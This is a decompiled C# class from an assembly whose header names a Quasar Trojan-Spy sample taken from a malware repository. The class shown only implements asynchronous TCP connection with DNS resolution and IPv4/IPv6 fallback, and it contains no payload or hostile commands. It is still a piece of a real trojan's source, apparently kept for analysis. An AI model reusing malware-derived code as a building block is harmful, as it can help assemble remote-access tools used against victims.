// Decompiled with JetBrains decompiler
// Type: Havens.Models.Local.Extensions.ConnectAsyncExtension
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Net;
using System.Net.Sockets;

namespace Havens.Models.Local.Extensions
{
  public static class ConnectAsyncExtension
  {
    private static void SocketAsyncEventCompleted(object sender, SocketAsyncEventArgs e)
    {
      e.Completed -= new EventHandler<SocketAsyncEventArgs>(ConnectAsyncExtension.SocketAsyncEventCompleted);
      ConnectAsyncExtension.ConnectToken userToken = (ConnectAsyncExtension.ConnectToken) e.UserToken;
      e.UserToken = (object) null;
      userToken.Callback(sender as Socket, userToken.State, e, (Exception) null);
    }

    private static SocketAsyncEventArgs CreateSocketAsyncEventArgs(
      EndPoint remoteEndPoint,
      ConnectedCallback callback,
      object state)
    {
      SocketAsyncEventArgs socketAsyncEventArgs = new SocketAsyncEventArgs();
      socketAsyncEventArgs.UserToken = (object) new ConnectAsyncExtension.ConnectToken()
      {
        State = state,
        Callback = callback
      };
      socketAsyncEventArgs.RemoteEndPoint = remoteEndPoint;
      socketAsyncEventArgs.Completed += new EventHandler<SocketAsyncEventArgs>(ConnectAsyncExtension.SocketAsyncEventCompleted);
      return socketAsyncEventArgs;
    }

    public static void ConnectAsync(
      this EndPoint remoteEndPoint,
      EndPoint localEndPoint,
      ConnectedCallback callback,
      object state)
    {
      remoteEndPoint.ConnectAsyncpublic(localEndPoint, callback, state);
    }

    private static void ConnectAsyncpublic(
      this EndPoint remoteEndPoint,
      EndPoint localEndPoint,
      ConnectedCallback callback,
      object state)
    {
      if (remoteEndPoint is MailRy.Net.DnsEndPoint)
      {
        MailRy.Net.DnsEndPoint dnsEndPoint = (MailRy.Net.DnsEndPoint) remoteEndPoint;
        IAsyncResult hostAddresses = Dns.BeginGetHostAddresses(dnsEndPoint.Host, new AsyncCallback(ConnectAsyncExtension.OnGetHostAddresses), (object) new ConnectAsyncExtension.DnsConnectState()
        {
          Port = dnsEndPoint.Port,
          Callback = callback,
          State = state,
          LocalEndPoint = localEndPoint
        });
        if (!hostAddresses.CompletedSynchronously)
          return;
        ConnectAsyncExtension.OnGetHostAddresses(hostAddresses);
      }
      else
      {
        SocketAsyncEventArgs socketAsyncEventArgs = ConnectAsyncExtension.CreateSocketAsyncEventArgs(remoteEndPoint, callback, state);
        Socket socket = new Socket(remoteEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
        if (localEndPoint != null)
        {
          socket.ExclusiveAddressUse = false;
          socket.Bind(localEndPoint);
        }
        socket.ConnectAsync(socketAsyncEventArgs);
      }
    }

    private static IPAddress GetNextAddress(
      ConnectAsyncExtension.DnsConnectState state,
      out Socket attempSocket)
    {
      IPAddress nextAddress = (IPAddress) null;
      attempSocket = (Socket) null;
      int nextAddressIndex = state.NextAddressIndex;
      while (attempSocket == null)
      {
        if (nextAddressIndex >= state.Addresses.Length)
          return (IPAddress) null;
        nextAddress = state.Addresses[nextAddressIndex++];
        if (nextAddress.AddressFamily == AddressFamily.InterNetworkV6)
          attempSocket = state.Socket6;
        else if (nextAddress.AddressFamily == AddressFamily.InterNetwork)
          attempSocket = state.Socket4;
      }
      state.NextAddressIndex = nextAddressIndex;
      return nextAddress;
    }

    private static void CreateAttempSocket(ConnectAsyncExtension.DnsConnectState connectState)
    {
      if (Socket.OSSupportsIPv6)
        connectState.Socket6 = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp);
      connectState.Socket4 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
    }

    private static void OnGetHostAddresses(IAsyncResult result)
    {
      ConnectAsyncExtension.DnsConnectState asyncState = result.AsyncState as ConnectAsyncExtension.DnsConnectState;
      IPAddress[] hostAddresses;
      try
      {
        hostAddresses = Dns.EndGetHostAddresses(result);
      }
      catch (Exception ex)
      {
        asyncState.Callback((Socket) null, asyncState.State, (SocketAsyncEventArgs) null, ex);
        return;
      }
      if (hostAddresses == null || hostAddresses.Length == 0)
      {
        asyncState.Callback((Socket) null, asyncState.State, (SocketAsyncEventArgs) null, (Exception) new SocketException(11001));
      }
      else
      {
        asyncState.Addresses = hostAddresses;
        ConnectAsyncExtension.CreateAttempSocket(asyncState);
        Socket attempSocket;
        IPAddress nextAddress = ConnectAsyncExtension.GetNextAddress(asyncState, out attempSocket);
        if (nextAddress == null)
        {
          asyncState.Callback((Socket) null, asyncState.State, (SocketAsyncEventArgs) null, (Exception) new SocketException(10047));
        }
        else
        {
          if (asyncState.LocalEndPoint != null)
          {
            try
            {
              attempSocket.ExclusiveAddressUse = false;
              attempSocket.Bind(asyncState.LocalEndPoint);
            }
            catch (Exception ex)
            {
              asyncState.Callback((Socket) null, asyncState.State, (SocketAsyncEventArgs) null, ex);
              return;
            }
          }
          SocketAsyncEventArgs e = new SocketAsyncEventArgs();
          e.Completed += new EventHandler<SocketAsyncEventArgs>(ConnectAsyncExtension.SocketConnectCompleted);
          IPEndPoint ipEndPoint = new IPEndPoint(nextAddress, asyncState.Port);
          e.RemoteEndPoint = (EndPoint) ipEndPoint;
          e.UserToken = (object) asyncState;
          if (attempSocket.ConnectAsync(e))
            return;
          ConnectAsyncExtension.SocketConnectCompleted((object) attempSocket, e);
        }
      }
    }

    private static void SocketConnectCompleted(object sender, SocketAsyncEventArgs e)
    {
      ConnectAsyncExtension.DnsConnectState userToken = e.UserToken as ConnectAsyncExtension.DnsConnectState;
      if (e.SocketError == SocketError.Success)
      {
        ConnectAsyncExtension.ClearSocketAsyncEventArgs(e);
        userToken.Callback((Socket) sender, userToken.State, e, (Exception) null);
      }
      else if (e.SocketError != SocketError.HostUnreachable && e.SocketError != SocketError.ConnectionRefused)
      {
        ConnectAsyncExtension.ClearSocketAsyncEventArgs(e);
        userToken.Callback((Socket) null, userToken.State, e, (Exception) null);
      }
      else
      {
        Socket attempSocket;
        IPAddress nextAddress = ConnectAsyncExtension.GetNextAddress(userToken, out attempSocket);
        if (nextAddress == null)
        {
          ConnectAsyncExtension.ClearSocketAsyncEventArgs(e);
          e.SocketError = SocketError.HostUnreachable;
          userToken.Callback((Socket) null, userToken.State, e, (Exception) null);
        }
        else
        {
          e.RemoteEndPoint = (EndPoint) new IPEndPoint(nextAddress, userToken.Port);
          if (attempSocket.ConnectAsync(e))
            return;
          ConnectAsyncExtension.SocketConnectCompleted((object) attempSocket, e);
        }
      }
    }

    private static void ClearSocketAsyncEventArgs(SocketAsyncEventArgs e)
    {
      e.Completed -= new EventHandler<SocketAsyncEventArgs>(ConnectAsyncExtension.SocketConnectCompleted);
      e.UserToken = (object) null;
    }

    private class ConnectToken
    {
      public object State { get; set; }

      public ConnectedCallback Callback { get; set; }
    }

    private class DnsConnectState
    {
      public IPAddress[] Addresses { get; set; }

      public int NextAddressIndex { get; set; }

      public int Port { get; set; }

      public Socket Socket4 { get; set; }

      public Socket Socket6 { get; set; }

      public object State { get; set; }

      public ConnectedCallback Callback { get; set; }

      public EndPoint LocalEndPoint { get; set; }
    }
  }
}
